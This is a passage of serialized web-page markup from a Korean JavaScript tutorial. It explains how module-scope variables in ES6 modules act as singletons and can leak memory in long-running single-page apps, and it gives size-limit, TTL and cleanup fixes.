property\",\"children\":\"host\"}],[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\":\"}],\" process\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token property-access\",\"children\":\"env\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token constant\",\"children\":\"DB_HOST\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\",\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"8\",\"children\":[\"      \",[\"$\",\"span\",null,{\"className\":\"token literal-property property\",\"children\":\"credentials\"}],[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token function\",\"children\":\"loadCredentials\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\",\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 파일 읽기 등\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"9\",\"children\":[\"    \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"10\",\"children\":[\"  \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"11\",\"children\":[\"  \",[\"$\",\"span\",null,{\"className\":\"token keyword control-flow\",\"children\":\"return\"}],\" databaseConnection\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"12\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}],\"\\n\"]}]]}]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"$\",\"strong\",null,{\"children\":[\"결론: ES6 모듈의 라이브 바인딩 덕분에 \",[\"$\",\"code\",null,{\"children\":\"export const\"}],\" 방식이 전통적인 싱글톤 패턴과 100% 동일한 효과를 제공합니다!\"]}]}],\"\\n\",[\"$\",\"h4\",null,{\"id\":\"-주의-es6-모듈-스코프-변수의-영구-보존\",\"children\":\"🚨 주의: ES6 모듈 스코프 변수의 영구 보존\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"ES6 모듈 스코프에 선언된 변수는 페이지가 닫힐 때까지 영구 보존됩니다.\"}],\" 이것이 ES6 모듈에서 가장 위험한 메모리 누수 패턴 중 하나입니다.\"]}],\"\\n\",[\"$\",\"h4\",null,{\"id\":\"-메모리-참조-체인-분석\",\"children\":\"🔗 메모리 참조 체인 분석\"}],\"\\n\",[\"$\",\"div\",null,{\"className\":\"code-block-wrapper my-6\",\"children\":[\"$\",\"$L18\",null,{\"className\":\"code-highlight\",\"data-language\":\"\",\"children\":[\"$\",\"code\",null,{\"className\":\"code-highlight\",\"children\":[[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"1\",\"children\":\"GC Root (브라우저)\\n\"}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"2\",\"children\":\"    ↓\\n\"}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"3\",\"children\":\"Module Registry  \\n\"}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"4\",\"children\":\"    ↓\\n\"}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"5\",\"children\":\"your-module.js (Module Record)\\n\"}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"6\",\"children\":\"    ↓\\n\"}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"7\",\"children\":\"Module Environment\\n\"}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"8\",\"children\":\"    ↓\\n\"}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"9\",\"children\":\"const cache = new Map(); ← 영구 보존!\\n\"}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"10\",\"children\":\"    ↓\\n\"}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"11\",\"children\":\"cache.set()으로 추가된 모든 데이터 ← 계속 누적!\\n\"}]]}]}]}],\"\\n\",[\"$\",\"h4\",null,{\"id\":\"-실제-위험-시나리오\",\"children\":\"🚨 실제 위험 시나리오\"}],\"\\n\",[\"$\",\"div\",null,{\"className\":\"code-block-wrapper my-6\",\"children\":[\"$\",\"$L18\",null,{\"className\":\"language-javascript code-highlight\",\"data-language\":\"javascript\",\"children\":[\"$\",\"code\",null,{\"className\":\"language-javascript code-highlight\",\"children\":[[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"1\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// your-module.js\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"2\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"const\"}],\" cache \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"new\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token class-name\",\"children\":\"Map\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"  \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// ← 이 Map은 절대 해제되지 않음!\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"3\",\"children\":\"\\n\"}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"4\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword module\",\"children\":\"export\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"function\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token function\",\"children\":\"process\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token parameter\",\"children\":\"data\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"5\",\"children\":[\"  cache\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token method function property-access\",\"children\":\"set\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token known-class-name class-name\",\"children\":\"Date\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token method function property-access\",\"children\":\"now\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\",\"}],\" data\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"  \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// ← 호출할 때마다 계속 추가\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"6\",\"children\":[\"  \",[\"$\",\"span\",null,{\"className\":\"token keyword control-flow\",\"children\":\"return\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token function\",\"children\":\"processData\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],\"data\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"7\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"8\",\"children\":\"\\n\"}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"9\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 사용하는 곳\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"10\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword module\",\"children\":\"import\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token imports\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\" process \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}]]}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword module\",\"children\":\"from\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token string\",\"children\":\"'./your-module.js'\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"11\",\"children\":\"\\n\"}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"12\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 10,000번 호출하면 cache에 10,000개 항목이 영구 저장!\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"13\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword control-flow\",\"children\":\"for\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"let\"}],\" i \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token number\",\"children\":\"0\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\" i \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"\u003c\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token number\",\"children\":\"10000\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\" i\",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"++\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"14\",\"children\":[\"  \",[\"$\",\"span\",null,{\"className\":\"token function\",\"children\":\"process\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token template-string\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token template-punctuation string\",\"children\":\"`\"}],[\"$\",\"span\",null,{\"className\":\"token string\",\"children\":\"data-\"}],[\"$\",\"span\",null,{\"className\":\"token interpolation\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token interpolation-punctuation punctuation\",\"children\":\"$${\"}],\"i\",[\"$\",\"span\",null,{\"className\":\"token interpolation-punctuation punctuation\",\"children\":\"}\"}]]}],[\"$\",\"span\",null,{\"className\":\"token template-punctuation string\",\"children\":\"`\"}]]}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"15\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"16\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// → 모든 데이터가 페이지 이동 전까지 메모리에 남아있음\"}],\"\\n\"]}]]}]}]}],\"\\n\",[\"$\",\"h4\",null,{\"id\":\"-최악의-케이스-장시간-실행-spa\",\"children\":\"💀 최악의 케이스: 장시간 실행 SPA\"}],\"\\n\",[\"$\",\"ul\",null,{\"children\":[\"\\n\",[\"$\",\"li\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"24/7 SPA 앱\"}],\": 사용자가 탭을 계속 열어둠\"]}],\"\\n\",[\"$\",\"li\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"매분 API 호출\"}],\": 1일 = 1,440개, 1달 = 43,200개 캐시 항목\"]}],\"\\n\",[\"$\",\"li\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"예상 메모리 사용량\"}],\": 2GB+\"]}],\"\\n\",[\"$\",\"li\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"결과\"}],\": 브라우저 크래시! 💥\"]}],\"\\n\"]}],\"\\n\",[\"$\",\"h4\",null,{\"id\":\"-메모리-누수-방지-해결책\",\"children\":\"✅ 메모리 누수 방지 해결책\"}],\"\\n\",[\"$\",\"div\",null,{\"className\":\"code-block-wrapper my-6\",\"children\":[\"$\",\"$L18\",null,{\"className\":\"language-javascript code-highlight\",\"data-language\":\"javascript\",\"children\":[\"$\",\"code\",null,{\"className\":\"language-javascript code-highlight\",\"children\":[[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"1\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 1. 크기 제한 (LRU 캐시 패턴)\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"2\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"const\"}],\" cache \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"new\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token class-name\",\"children\":\"Map\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"3\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"const\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token constant\",\"children\":\"MAX_SIZE\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token number\",\"children\":\"100\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"4\",\"children\":\"\\n\"}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"5\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword module\",\"children\":\"export\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"function\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token function\",\"children\":\"process\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token parameter\",\"children\":\"data\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"6\",\"children\":[\"  \",[\"$\",\"span\",null,{\"className\":\"token keyword control-flow\",\"children\":\"if\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],\"cache\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token property-access\",\"children\":\"size\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"\u003e=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token constant\",\"children\":\"MAX_SIZE\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"7\",\"children\":[\"    \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"const\"}],\" firstKey \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" cache\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token method function property-access\",\"children\":\"keys\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token method function property-access\",\"children\":\"next\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token property-access\",\"children\":\"value\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"8\",\"children\":[\"    cache\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token method function property-access\",\"children\":\"delete\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],\"firstKey\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"  \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// FIFO: 가장 오래된 항목 삭제\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"9\",\"children\":[\"  \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"10\",\"children\":[\"  cache\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token method function property-access\",\"children\":\"set\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token known-class-name class-name\",\"children\":\"Date\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token method function property-access\",\"children\":\"now\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\",\"}],\" data\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"11\",\"children\":[\"  \",[\"$\",\"span\",null,{\"className\":\"token keyword control-flow\",\"children\":\"return\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token function\",\"children\":\"processData\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],\"data\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"12\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"13\",\"children\":\"\\n\"}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"14\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 2. TTL (Time To Live) 구현\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"15\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"const\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token constant\",\"children\":\"TTL\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token number\",\"children\":\"5\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"*\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token number\",\"children\":\"60\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"*\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token number\",\"children\":\"1000\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 5분\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"16\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"const\"}],\" cache \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"new\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token class-name\",\"children\":\"Map\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"17\",\"children\":\"\\n\"}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"18\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword module\",\"children\":\"export\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"function\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token function\",\"children\":\"processWithTTL\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token parameter\",\"children\":\"data\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"19\",\"children\":[\"  \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 만료된 항목 정리\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"20\",\"children\":[\"  \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"const\"}],\" now \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token known-class-name class-name\",\"children\":\"Date\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token method function property-access\",\"children\":\"now\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"21\",\"children\":[\"  \",[\"$\",\"span\",null,{\"className\":\"token keyword control-flow\",\"children\":\"for\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"const\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"[\"}],\"key\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\",\"}],\" value\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"]\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"of\"}],\" cache\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"22\",\"children\":[\"    \",[\"$\",\"span\",null,{\"className\":\"token keyword control-flow\",\"children\":\"if\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],\"now \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"-\"}],\" value\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token property-access\",\"children\":\"timestamp\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"\u003e\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token constant\",\"children\":\"TTL\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"23\",\"children\":[\"      cache\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token method function property-access\",\"children\":\"delete\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],\"key\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"24\",\"children\":[\"    \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"25\",\"children\":[\"  \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"26\",\"children\":[\"  cache\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token method function property-access\",\"children\":\"set\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],\"now\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\",\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\" data\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\",\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token literal-property property\",\"children\":\"timestamp\"}],[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\":\"}],\" now \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"27\",\"children\":[\"  \",[\"$\",\"span\",null,{\"className\":\"token keyword control-flow\",\"children\":\"return\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token function\",\"children\":\"processData\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],\"data\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"28\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"29\",\"children\":\"\\n\"}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"30\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 3. 명시적 정리 메서드 제공\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"31\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword module\",\"children\":\"export\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"function\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token 